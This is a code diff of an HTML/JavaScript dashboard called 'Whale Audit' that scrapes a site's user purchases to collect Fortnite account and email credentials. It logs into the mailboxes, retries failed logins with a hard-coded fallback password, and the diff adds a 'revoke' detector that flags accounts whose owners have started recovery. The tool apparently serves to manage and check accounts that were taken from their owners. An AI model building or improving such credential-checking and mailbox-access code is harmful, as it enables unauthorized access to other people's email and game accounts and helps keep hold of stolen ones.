@@ -1,8 +1,9 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Whale Audit v12.4 | Turbo Edition</title>
+<title>Whale Audit v12.5 | Revoke Scanner</title>
 <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
 <style>
 :root {
@@ -25,7 +26,6 @@ body {
 
 #particles-js { position: fixed; width: 100%; height: 100%; top: 0; left: 0; z-index: -1; }
 
-/* --- THEME PANEL --- */
 .theme-panel {
     max-width: 1200px; margin: 0 auto 20px auto;
     background: var(--card-bg); padding: 15px; border-radius: 15px;
@@ -36,7 +36,6 @@ body {
 .theme-group { display: flex; align-items: center; gap: 10px; font-size: 0.85rem; font-weight: bold; }
 .color-swatch { width: 30px; height: 30px; border-radius: 50%; border: 2px solid white; cursor: pointer; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
 
-/* --- UI COMPONENTS --- */
 .header-section { max-width: 1200px; margin: 0 auto 30px auto; }
 .stats-bar { 
     display: flex; justify-content: space-around; background: var(--card-bg); 
@@ -64,15 +63,11 @@ body {
 .btn-refresh { background: var(--accent); color: white !important; border: none; }
 .btn-mail { background: #6f42c1; color: white !important; border: none; }
 
-/* FIX: Input text colors */
 input[type="text"], select, input[type="color"], .pw-input { 
-    background: white !important; 
-    border: 1px solid var(--border); 
-    color: #000 !important; 
-    padding: 10px; border-radius: 8px; outline: none; 
+    background: white !important; border: 1px solid var(--border); 
+    color: #000 !important; padding: 10px; border-radius: 8px; outline: none; 
 }
 .pw-input { padding: 2px; width: 110px; text-align: right; }
-option { color: #000 !important; background: #fff !important; }
 
 .container { max-width: 1200px; margin: 0 auto; display: grid; grid-template-columns: repeat(auto-fill, minmax(500px, 1fr)); gap: 20px; }
 .account-panel { 
@@ -81,17 +76,17 @@ option { color: #000 !important; background: #fff !important; }
     transition: 0.3s; position: relative; color: #1a1a1a;
 }
 
-.badge { padding: 5px 12px; border-radius: 20px; font-size: 0.7rem; font-weight: bold; }
+.badge { padding: 5px 12px; border-radius: 20px; font-size: 0.7rem; font-weight: bold; margin-left: 5px; }
 .badge-admin { background: #ffebee; color: #c62828; border: 1px solid #ffcdd2; }
 .badge-mail-error { background: #fff3e0; color: #e65100; border: 1px solid #ffe0b2; }
+.badge-revoked { background: #333; color: #ffeb3b; border: 1px solid #000; }
 
 .data-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
 .data-group h4 { margin: 15px 0 10px 0; font-size: 0.75rem; color: #6c757d; text-transform: uppercase; }
 .row { display: flex; justify-content: space-between; font-size: 0.9rem; margin-bottom: 4px; }
 .val { font-weight: 600; font-family: monospace; }
 
-.mail-section { margin-top: 20px; padding-top: 15px; border-top: 1px solid var(--border); }
-.mail-toggle-btn { width: 100%; background: rgba(0,0,0,0.05); padding: 12px; border: 1px solid var(--border); color: var(--accent); font-weight: bold; border-radius: 8px; cursor: pointer; }
+.mail-toggle-btn { width: 100%; background: rgba(0,0,0,0.05); padding: 12px; border: 1px solid var(--border); color: var(--accent); font-weight: bold; border-radius: 8px; cursor: pointer; margin-top:10px;}
 .mail-container { display: none; margin-top: 15px; background: white; padding: 15px; border-radius: 10px; border: 1px solid var(--border); color: #000; }
 </style>
 </head>
@@ -107,12 +102,8 @@ option { color: #000 !important; background: #fff !important; }
         <div class="color-swatch" style="background: linear-gradient(to right, #fff5f5, #ff4e50);" title="Sunset" onclick="applyPreset('sunset')"></div>
         <div class="color-swatch" style="background: linear-gradient(to right, #000000, #00ff41);" title="Matrix" onclick="applyPreset('matrix')"></div>
     </div>
-    <div class="theme-group">
-        Accent: <input type="color" id="accentPicker" value="#007bff" oninput="updateTheme()">
-    </div>
-    <div class="theme-group">
-        Background: <input type="color" id="bgPicker" value="#f0f2f5" oninput="updateTheme()">
-    </div>
+    <div class="theme-group">Accent: <input type="color" id="accentPicker" value="#007bff" oninput="updateTheme()"></div>
+    <div class="theme-group">BG: <input type="color" id="bgPicker" value="#f0f2f5" oninput="updateTheme()"></div>
 </div>
 
 <div class="header-section">
@@ -127,26 +118,18 @@ option { color: #000 !important; background: #fff !important; }
 <div class="controls">
     <input type="text" id="search" placeholder="Search logins..." oninput="render()">
     
-    <div style="background: rgba(0,0,0,0.05); padding: 5px 15px; border-radius: 8px; display: flex; gap: 15px;">
-        <label style="font-size:0.85rem; cursor:pointer; color: #000;">
-            <input type="checkbox" id="mailErrorOnly" onchange="render()"> Errors Only
-        </label>
-        <label style="font-size:0.85rem; cursor:pointer; color: #000;">
-            <input type="checkbox" id="noMailError" onchange="render()"> Working Only
-        </label>
+    <div style="background: rgba(0,0,0,0.05); padding: 5px 15px; border-radius: 8px; display: flex; gap: 15px; align-items: center;">
+        <label style="font-size:0.85rem; cursor:pointer; color: #000;"><input type="checkbox" id="mailErrorOnly" onchange="render()"> Errors</label>
+        <label style="font-size:0.85rem; cursor:pointer; color: #000;"><input type="checkbox" id="noMailError" onchange="render()"> Working</label>
+        <label style="font-size:0.85rem; cursor:pointer; color: #d32f2f; font-weight:bold;"><input type="checkbox" id="revokedOnly" onchange="render()"> ⚠️ Revoked</label>
     </div>
 
     <select id="sortOption" onchange="render()">
         <option value="newest">Sort: Newest</option>
         <option value="admin">Sort: Admins First</option>
-        <option value="bal_high">Balance: High to Low</option>
-        <option value="bal_low">Balance: Low to High</option>
         <option value="spent_high">Spent: High to Low</option>
-        <option value="spent_low">Spent: Low to High</option>
         <option value="fn_high">V-Bucks: High to Low</option>
-        <option value="fn_low">V-Bucks: Low to High</option>
         <option value="skins_high">Skins: High to Low</option>
-        <option value="skins_low">Skins: Low to High</option>
     </select>
 
     <button class="btn btn-refresh" onclick="masterRefresh()">🚀 Deep Scrape</button>
@@ -154,7 +137,7 @@ option { color: #000 !important; background: #fff !important; }
     <button class="btn" onclick="document.getElementById('fileInput').click()">📥 Import</button>
     <button class="btn" onclick="exportJSON()">📤 Export</button>
     <button class="btn" onclick="clearData()" style="color:var(--red)">🗑️ Reset</button>
-    <input type="file" id="fileInput" accept=".json" onchange="importJSON(event)">
+    <input type="file" id="fileInput" accept=".json" onchange="importJSON(event)" style="display:none;">
 </div>
 
 <div class="container" id="mainContainer"></div>
@@ -173,33 +156,23 @@ const CONFIG = {
 let auditData = JSON.parse(localStorage.getItem('audit_v12_storage') || "[]");
 let currentJWT = "";
 
-// --- THEME ENGINE ---
-function updateTheme() {
-    const root = document.documentElement;
-    const accent = document.getElementById('accentPicker').value;
-    const bg = document.getElementById('bgPicker').value;
-    root.style.setProperty('--accent', accent);
-    root.style.setProperty('--bg', bg);
-    
-    const rgb = parseInt(bg.substring(1), 16);
-    const r = (rgb >> 16) & 0xff, g = (rgb >> 8) & 0xff, b = (rgb >> 0) & 0xff;
-    const luma = 0.2126 * r + 0.7152 * g + 0.0722 * b;
-    
-    root.style.setProperty('--card-bg', luma < 128 ? 'rgba(30,30,30,0.9)' : 'rgba(255,255,255,0.95)');
-    root.style.setProperty('--border', luma < 128 ? '#444' : '#dee2e6');
+// --- REVOKE CHECKER LOGIC ---
+// Pattern looks for: a***z@domain.tld or similar obscured addresses in the email text
+const REVOKE_PATTERN = /[a-zA-Z]\*+[a-zA-Z]@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/;
+
+function isRevoked(emails) {
+    if (!emails || !Array.isArray(emails)) return false;
+    // Check subject for keywords AND body for the pattern you provided
+    return emails.some(m => {
+        const subject = m.subject.toLowerCase();
+        const text = (m.text || m.html || "").toLowerCase();
+        const hasRevokeKeywords = subject.includes("odzyskan") || subject.includes("recovery") || subject.includes("odzyskanie");
+        const hasPattern = REVOKE_PATTERN.test(text);
+        return hasRevokeKeywords || hasPattern;
+    });
 }
 
-function applyPreset(name) {
-    const acc = document.getElementById('accentPicker');
-    const bg = document.getElementById('bgPicker');
-    if(name === 'ocean') { acc.value = "#007bff"; bg.value = "#f0f2f5"; }
-    if(name === 'midnight') { acc.value = "#e94560"; bg.value = "#1a1a2e"; }
-    if(name === 'sunset') { acc.value = "#ff4e50"; bg.value = "#fff5f5"; }
-    if(name === 'matrix') { acc.value = "#00ff41"; bg.value = "#000000"; }
-    updateTheme();
-}
-
-// --- TURBO MAIL FILTER (Parallel Threads) ---
+// --- TURBO MAIL FILTER ---
 async function checkAllMailboxesParallel() {
     const status = document.getElementById('status-text');
     const bar = document.getElementById('bar');
@@ -219,25 +192,55 @@ async function checkAllMailboxesParallel() {
             try {
                 let r = await fetch(`${CONFIG.MAIL_API}?email=${encodeURIComponent(item.email_login)}&password=${encodeURIComponent(item.email_password)}`);
                 let d = await r.json();
+                
                 if(d.error && d.error.includes("Invalid login")) {
                     let r2 = await fetch(`${CONFIG.MAIL_API}?email=${encodeURIComponent(item.email_login)}&password=${encodeURIComponent(CONFIG.FALLBACK_PW)}`);
                     let d2 = await r2.json();
-                    if(d2.error) { item.email_error = true; } 
-                    else { item.email_password = CONFIG.FALLBACK_PW; item.email_error = false; }
-                } else { item.email_error = false; }
+                    if(d2.error) { 
+                        item.email_error = true; 
+                    } else { 
+                        item.email_password = CONFIG.FALLBACK_PW; 
+                        item.email_error = false;
+                        item.is_revoked = isRevoked(d2.emails);
+                    }
+                } else { 
+                    item.email_error = false;
+                    item.is_revoked = isRevoked(d.emails);
+                }
             } catch(e) { item.email_error = true; }
         }
     }
 
     const threads = Array(threadCount).fill(null).map(worker);
     await Promise.all(threads);
-
     saveAndRender();
     wrapper.style.display = 'none';
     status.innerText = "Filter Complete";
 }
 
-// --- DATA LOGIC ---
+// --- THEME & CORE LOGIC ---
+function updateTheme() {
+    const root = document.documentElement;
+    const accent = document.getElementById('accentPicker').value;
+    const bg = document.getElementById('bgPicker').value;
+    root.style.setProperty('--accent', accent);
+    root.style.setProperty('--bg', bg);
+    const rgb = parseInt(bg.substring(1), 16);
+    const luma = 0.2126*((rgb>>16)&0xff) + 0.7152*((rgb>>8)&0xff) + 0.0722*(rgb&0xff);
+    root.style.setProperty('--card-bg', luma < 128 ? 'rgba(30,30,30,0.9)' : 'rgba(255,255,255,0.95)');
+    root.style.setProperty('--border', luma < 128 ? '#444' : '#dee2e6');
+}
+
+function applyPreset(name) {
+    const acc = document.getElementById('accentPicker');
+    const bg = document.getElementById('bgPicker');
+    if(name === 'ocean') { acc.value = "#007bff"; bg.value = "#f0f2f5"; }
+    if(name === 'midnight') { acc.value = "#e94560"; bg.value = "#1a1a2e"; }
+    if(name === 'sunset') { acc.value = "#ff4e50"; bg.value = "#fff5f5"; }
+    if(name === 'matrix') { acc.value = "#00ff41"; bg.value = "#000000"; }
+    updateTheme();
+}
+
 async function fetchNewToken() {
     const r = await fetch(CONFIG.AUTH_URL, {
         method: 'POST',
@@ -254,28 +257,24 @@ async function masterRefresh() {
     const wrapper = document.getElementById('progWrapper');
     wrapper.style.display = 'block';
     status.innerText = "Connecting...";
-
     try {
         currentJWT = await fetchNewToken();
         let allUsers = [];
         let page = 1;
         let hasMore = true;
-
         while(hasMore) {
             status.innerText = `Indexing: ${allUsers.length}`;
             const r = await fetch(`${CONFIG.BASE}?page=${page}&limit=100`, { headers: { 'Authorization': `Bearer ${currentJWT}` } });
             const d = await r.json();
             if(!d.users || d.users.length === 0) hasMore = false;
             else { allUsers.push(...d.users); page++; }
-            if(allUsers.length > 2000) hasMore = false; 
+            if(allUsers.length > 1500) hasMore = false; 
         }
-
         let results = [];
         for (let i = 0; i < allUsers.length; i += 5) {
             const chunk = allUsers.slice(i, i + 5);
             status.innerText = `Fetching: ${i}/${allUsers.length}`;
             bar.style.width = `${(i / allUsers.length) * 100}%`;
-
             await Promise.all(chunk.map(async (u) => {
                 try {
                     const pr = await fetch(`${CONFIG.BASE}/${u.id}/purchases`, { headers: { 'Authorization': `Bearer ${currentJWT}` } });
@@ -290,7 +289,8 @@ async function masterRefresh() {
                             email_login: parts[2] || 'N/A', email_password: parts[3] || 'N/A',
                             fortnite_balance: parseInt(acc.fortnite_balance) || 0,
                             fortnite_username: acc.fortnite_username || "Unknown",
-                            skin_count: parseInt(acc.fortnite_skin_count) || 0, email_error: false
+                            skin_count: parseInt(acc.fortnite_skin_count) || 0, 
+                            email_error: false, is_revoked: false
                         });
                     });
                 } catch(e) {}
@@ -302,51 +302,49 @@ async function masterRefresh() {
     } catch(err) { status.innerText = "Error"; }
     setTimeout(() => wrapper.style.display = 'none', 2000);
 }
-
-function setCustomPassword(itemId, newPass) {
-    const idx = auditData.findIndex(x => x.item_id == itemId);
-    if(idx !== -1) { auditData[idx].email_password = newPass; auditData[idx].email_error = false; saveAndRender(); }
-}
-
 function render() {
     const container = document.getElementById('mainContainer');
     const term = document.getElementById('search').value.toLowerCase();
     const sort = document.getElementById('sortOption').value;
     const errorOnly = document.getElementById('mailErrorOnly').checked;
     const workingOnly = document.getElementById('noMailError').checked;
+    const revokedOnly = document.getElementById('revokedOnly').checked;
 
     let filtered = auditData.filter(x => {
         const matchesSearch = `${x.fortnite_username} ${x.user_email} ${x.email_login}`.toLowerCase().includes(term);
-        const matchesError = errorOnly ? x.email_error === true : true;
-        const matchesWorking = workingOnly ? x.email_error === false : true;
-        return matchesSearch && matchesError && matchesWorking;
-    });
+        
+        // Logical Filters
+        let matchesError = errorOnly ? x.email_error === true : true;
+        let matchesRevoked = revokedOnly ? x.is_revoked === true : true;
+        
+        // "Working" logic: If checked, MUST NOT have mail error AND MUST NOT be revoked
+        let matchesWorking = true;
+        if (workingOnly) {
+            matchesWorking = (x.email_error === false && x.is_revoked === false);
+        }
 
-    const uniqueUsers = new Map();
-    filtered.forEach(item => { if(!uniqueUsers.has(item.user_id)) uniqueUsers.set(item.user_id, item.total_spent_on_site); });
-    const totalRevenue = Array.from(uniqueUsers.values()).reduce((a, b) => a + b, 0);
+        return matchesSearch && matchesError && matchesWorking && matchesRevoked;
+    });
 
     filtered.sort((a, b) => {
         if(sort === "admin") return b.is_admin - a.is_admin;
-        if(sort === "bal_high") return b.user_site_balance - a.user_site_balance;
-        if(sort === "bal_low") return a.user_site_balance - b.user_site_balance;
         if(sort === "spent_high") return b.total_spent_on_site - a.total_spent_on_site;
-        if(sort === "spent_low") return a.total_spent_on_site - b.total_spent_on_site;
         if(sort === "fn_high") return b.fortnite_balance - a.fortnite_balance;
-        if(sort === "fn_low") return a.fortnite_balance - b.fortnite_balance;
         if(sort === "skins_high") return b.skin_count - a.skin_count;
-        if(sort === "skins_low") return a.skin_count - b.skin_count;
         return 0;
     });
 
+    // Update Stats
     document.getElementById('stat-count').innerText = filtered.length;
-    document.getElementById('stat-rev').innerText = `$${totalRevenue.toFixed(2)}`;
-
+    const totalRev = filtered.reduce((acc, curr) => acc + (curr.total_spent_on_site || 0), 0);
+    document.getElementById('stat-rev').innerText = `$${totalRev.toFixed(2)}`;
+    
     container.innerHTML = filtered.map(item => `
-        <div class="account-panel">
-            <div style="display:flex; justify-content:space-between;">
+        <div class="account-panel" style="${item.is_revoked ? 'border: 2px solid #000; background: #fffde7;' : ''}">
+            <div style="display:flex; justify-content:space-between; align-items:center;">
                 <h2 style="margin:0;">${item.fortnite_username}</h2>
                 <div>
+                    ${item.is_revoked ? '<span class="badge badge-revoked">⚠️ REVOKED</span>' : ''}
                     ${item.is_admin ? '<span class="badge badge-admin">Admin</span>' : ''}
                     ${item.email_error ? '<span class="badge badge-mail-error">Mail Error</span>' : ''}
                 </div>
@@ -372,7 +370,6 @@ function render() {
         </div>
     `).join('');
 }
-
 async function toggleMailBox(id, email, pass) {
     const zone = document.getElementById(`mail-zone-${id}`);
     const list = document.getElementById(`list-${id}`);
@@ -383,8 +380,9 @@ async function toggleMailBox(id, email, pass) {
         const d = await r.json();
         list.innerHTML = (d.emails || []).map(m => `
             <div style="border-bottom:1px solid #eee; padding:5px 0; color: #000;">
-                <b>${m.subject}</b> <button class="btn" style="padding:2px 5px; font-size:0.7rem;" onclick="this.nextElementSibling.style.display='block'">View</button>
-                <iframe sandbox srcdoc="${m.html.replace(/"/g, '&quot;')}" style="display:none; width:100%; height:250px;"></iframe>
+                <b>${m.subject} ${REVOKE_PATTERN.test(m.text || m.html) ? '⚠️' : ''}</b> 
+                <button class="btn" style="padding:2px 5px; font-size:0.7rem;" onclick="this.nextElementSibling.style.display='block'">View</button>
+                <iframe sandbox srcdoc="${(m.html || m.text).replace(/"/g, '&quot;')}" style="display:none; width:100%; height:250px;"></iframe>
             </div>`).join('') || "Empty.";
     } catch(e) { list.innerHTML = "Error."; }
 }
@@ -393,7 +391,7 @@ function saveAndRender() { localStorage.setItem('audit_v12_storage', JSON.string
 function clearData() { if(confirm("Reset?")) { auditData = []; saveAndRender(); } }
 function exportJSON() {
     const blob = new Blob([JSON.stringify(auditData, null, 2)], { type: 'application/json' });
-    const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = `audit_v12.4.json`; a.click();
+    const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = `audit_v12.5.json`; a.click();
 }
 function importJSON(e) {
     const reader = new FileReader();
@@ -403,14 +401,10 @@ function importJSON(e) {
 
 particlesJS('particles-js', {
     "particles": { 
-        "number": { "value": 80 }, 
-        "color": { "value": "#888" }, 
-        "opacity": { "value": 0.2 }, 
-        "size": { "value": 3 }, 
-        "line_linked": { "enable": true, "distance": 150, "color": "#888", "opacity": 0.2, "width": 1 }, 
-        "move": { "enable": true, "speed": 1.5, "direction": "none", "random": false, "straight": false, "out_mode": "out", "bounce": false } 
-    },
-    "interactivity": { "events": { "onhover": { "enable": true, "mode": "repulse" } } }
+        "number": { "value": 80 }, "color": { "value": "#888" }, "opacity": { "value": 0.2 }, 
+        "size": { "value": 3 }, "line_linked": { "enable": true, "opacity": 0.1 }, 
+        "move": { "enable": true, "speed": 1.5 } 
+    }
 });
 
 window.onload = () => { applyPreset('ocean'); render(); };
